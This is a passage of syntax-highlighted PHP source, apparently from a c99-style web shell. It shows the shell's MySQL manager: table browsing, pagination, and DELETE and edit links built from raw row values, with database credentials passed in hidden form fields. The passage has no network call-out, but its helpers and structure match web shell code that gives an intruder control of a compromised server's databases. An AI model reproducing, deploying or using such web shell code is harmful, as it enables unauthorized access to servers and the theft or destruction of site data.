<span class="lineno"> 833</span>                   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; or &lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2"> checked&gt;&lt;b&gt;Save&lt;/b&gt;&quot;</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_q</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 834</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 835</span>                 <span class="p">}</span>
<span class="lineno"> 836</span>               <span class="p">}</span>
<span class="lineno"> 837</span>               <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;browse&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 838</span>                 <span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">);</span>
<span class="lineno"> 839</span>                 <span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">);</span>
<span class="lineno"> 840</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 841</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=multipage</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Pages</span><span class="se">\&quot;</span><span class="s2">&gt; &quot;</span><span class="p">;</span>
<span class="lineno"> 842</span>                 <span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 843</span>                 <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$numpages</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 844</span>                   <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;u&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 845</span>                   <span class="k">echo</span> <span class="nv">$i</span><span class="p">;</span>
<span class="lineno"> 846</span>                   <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;/u&gt;&lt;/a&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 847</span>                   <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span> <span class="o">==</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 848</span>                   <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot; &quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 849</span>                 <span class="p">}</span>
<span class="lineno"> 850</span>                 <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;empty&quot;</span><span class="p">;}</span>
<span class="lineno"> 851</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;form method=</span><span class="se">\&quot;</span><span class="s2">GET</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_order</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;From:&lt;/b&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_ls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt; &lt;b&gt;To:&lt;/b&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_le</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">View</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 852</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 853</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;&lt;tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 854</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow_all</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 855</span>                 <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 856</span>                   <span class="nv">$v</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
<span class="lineno"> 857</span>                   <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;asc&quot;</span><span class="p">;}</span>
<span class="lineno"> 858</span>                   <span class="k">else</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;desc&quot;</span><span class="p">;}</span>
<span class="lineno"> 859</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 860</span>                   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
<span class="lineno"> 861</span>                   <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;%20&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 862</span>                   <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s2">&quot;%20&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_&quot;</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 863</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 864</span>                 <span class="p">}</span>
<span class="lineno"> 865</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 866</span>                 <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 867</span>                 <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 868</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 869</span>                   <span class="nv">$w</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 870</span>                   <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 871</span>                   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 872</span>                     <span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
<span class="lineno"> 873</span>                     <span class="nv">$w</span> <span class="o">.=</span> <span class="s2">&quot; `&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;` = &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; AND&quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 874</span>                   <span class="p">}</span>
<span class="lineno"> 875</span>                   <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$w</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 876</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow[]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 877</span>                   <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 878</span>                   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 879</span>                     <span class="nv">$v</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno"> 880</span>                     <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&gt;NULL&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 881</span>                     <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 882</span>                     <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 883</span>                   <span class="p">}</span>
<span class="lineno"> 884</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 885</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_query=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;Delete&lt;/a&gt; &quot;</span><span class="p">;</span>
<span class="lineno"> 886</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl_act=insert&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_insert_q=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;Edit&lt;/a&gt; &quot;</span><span class="p">;</span>
<span class="lineno"> 887</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 888</span>                   <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 889</span>                <span class="p">}</span>
<span class="lineno"> 890</span>                <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno"> 891</span>                <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;&lt;p align=</span><span class="se">\&quot;</span><span class="s2">left</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=arrow_ltr</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2"> ^ </span><span class="se">\&quot;</span><span class="s2">&gt;&lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 892</span>                <span class="k">echo</span> <span class="s2">&quot;&lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&gt;With selected:&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 893</span>                <span class="k">echo</span> <span class="s2">&quot;&lt;option value=</span><span class="se">\&quot;</span><span class="s2">deleterow</span><span class="se">\&quot;</span><span class="s2">&gt;Delete&lt;/option&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 894</span>                <span class="k">echo</span> <span class="s2">&quot;&lt;/select&gt; &lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&lt;/p&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 895</span>             <span class="p">}</span>
<span class="lineno"> 896</span>          <span class="p">}</span>
<span class="lineno"> 897</span>          <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 898</span>            <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLE STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno"> 899</span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno"> 900</span>            <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 901</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 902</span> 
<span class="lineno"> 903</span> 
<span class="lineno"> 904</span> <span class="x">    &lt;form method=&quot;POST&quot;&gt;</span>
<span class="lineno"> 905</span> <span class="x">    &lt;table&gt;</span>
<span class="lineno"> 906</span> <span class="x">        &lt;tr&gt;&lt;th&gt;&lt;input type=&quot;checkbox&quot; name=&quot;boxtbl_all&quot; value=&quot;1&quot;&gt;&lt;/th&gt;&lt;th&gt;Table&lt;/th&gt;&lt;th&gt;Rows&lt;/th&gt;&lt;th&gt;Engine&lt;/th&gt;&lt;th&gt;Created&lt;/th&gt;&lt;th&gt;Modified&lt;/th&gt;&lt;th&gt;Size&lt;/th&gt;&lt;th&gt;Action&lt;/th&gt;&lt;/tr&gt;</span>
<span class="lineno"> 907</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 908</span>              <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 909</span>              <span class="nv">$tsize</span> <span class="o">=</span> <span class="nv">$trows</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 910</span>              <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 911</span>                <span class="nv">$tsize</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">];</span>
<span class="lineno"> 912</span>                <span class="nv">$trows</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">];</span>
<span class="lineno"> 913</span>                <span class="nv">$size</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">]);</span>
<span class="lineno"> 914</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 915</span> 
<span class="lineno"> 916</span> 
<span class="lineno"> 917</span> <span class="x">        &lt;tr&gt;</span>
